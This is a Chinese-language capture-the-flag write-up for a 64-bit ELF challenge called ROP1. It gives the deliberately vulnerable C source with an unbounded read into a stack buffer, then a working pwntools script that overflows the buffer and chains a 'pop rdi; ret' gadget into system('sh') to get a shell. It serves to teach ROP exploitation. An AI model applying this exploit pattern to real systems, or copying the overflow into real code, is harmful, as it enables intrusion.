# ROP1

## 题目简述

64 位 ELF 在 `main()` 中把最多 `0x100` 字节读入 `0x20` 字节栈缓冲区，形成返回地址覆盖。程序还主动提供 `pop rdi; ret` gadget、`system@plt`，并在只读数据中留下以空字节结尾的 `sh` 字符串，已经具备调用 `system("sh")` 的全部条件。

## 解题过程

关键源码如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>

void gadget()
{
    asm volatile (
        "pop rdi;"
        "ret;"
    );
}

void help()
{
    system("echo Maybe you need this: sh");
}

int main()
{
    char ss[0x20];
    puts("what's ROP????");
    help();
    read(0,ss,0x100);
    return 0;
}
```

缓冲区到返回地址的偏移为 `0x20 + 8 = 0x28`。按照 System V AMD64 调用约定，第一个参数放入 `rdi`，因此 ROP 链依次为：

```text
padding -> pop rdi; ret -> &"sh" -> system@plt
```

使用 pwntools 从 ELF 动态取得地址，避免依赖一次编译产生的硬编码常量：

```python
from pwn import *

elf = context.binary = ELF('./pwn', checksec=False)
rop = ROP(elf)
io = process(elf.path)

pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
sh = next(elf.search(b'sh\x00'))
payload = flat(
    b'A' * 0x28,
    pop_rdi,
    sh,
    elf.plt['system'],
)

io.send(payload)
io.interactive()
```

## 方法总结

- 核心技巧：利用栈溢出控制返回地址，以 `pop rdi; ret` 设置参数后调用已有 `system()`。
- 识别信号：无界 `read()`、可控返回地址、现成参数字符串与 PLT 函数。
- 复用要点：先确认架构、保护和精确偏移，再按调用约定组织 ROP；地址应优先由 ELF/ROP 工具解析，而不是手抄。
